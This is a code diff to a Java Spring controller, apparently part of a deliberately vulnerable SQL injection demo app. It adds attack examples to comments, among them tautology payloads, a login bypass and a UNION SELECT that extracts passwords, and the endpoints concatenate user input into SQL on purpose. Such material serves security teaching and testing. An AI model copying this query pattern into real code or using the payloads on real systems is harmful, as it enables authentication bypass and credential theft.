@@ -35,8 +35,8 @@ public class UserController {
      * <p>
      * Attack examples:
      * GET /api/users/by-username?username=admin' OR '1'='1
-     * GET /api/users/by-username?username=admin'--
      * GET /api/users/by-username?username=' OR '1'='1'--
+     * GET /api/users/by-username?username=' UNION SELECT u.ID, u.USERNAME, u.PASSWORD as EMAIL, u.PASSWORD, u.ROLE FROM users u--"
      */
     @GetMapping("/by-username")
     public ApiResponse<List<UserDto>> findByUsername(@RequestParam String username) {
@@ -52,6 +52,7 @@ public class UserController {
      * <p>
      * Attack examples:
      * GET /api/users/by-email?email=admin@example.com' OR '1'='1
+     * GET /api/users/by-email?email=' OR '1'='1
      */
     @GetMapping("/by-email")
     public ApiResponse<List<UserDto>> findByEmail(@RequestParam String email) {
@@ -68,6 +69,7 @@ public class UserController {
      * Attack examples:
      * POST /api/users/login
      * Body: {"username": "admin", "password": "' OR '1'='1"}
+     * Body: {"username": "any' OR '1'='1'--", "password": "Karapuzik"}
      */
     @PostMapping("/login")
     public ApiResponse<Map<String, String>> login(@RequestBody Map<String, String> credentials) {
@@ -83,13 +85,14 @@ public class UserController {
     }
 
     /**
-     * VULNERABLE ENDPOINT: Search users
+     * VULNERABLE ENDPOINT: Search users by username/email
      * <p>
      * Attack examples:
      * GET /api/users/by-term?term=admin' OR '1'='1'--
+     * GET /api/users/by-term?term=' OR '1'='1'--
      */
     @GetMapping("/by-term")
-    public ApiResponse<List<UserDto>> searchAll(@RequestParam String term) {
+    public ApiResponse<List<UserDto>> findByTerm(@RequestParam String term) {
         String query = "SELECT * FROM users WHERE username LIKE '%" + term + "%' OR email LIKE '%" + term + "%'";
 
         List<User> users = vulnerableUserRepository.searchUsersVulnerable(term);
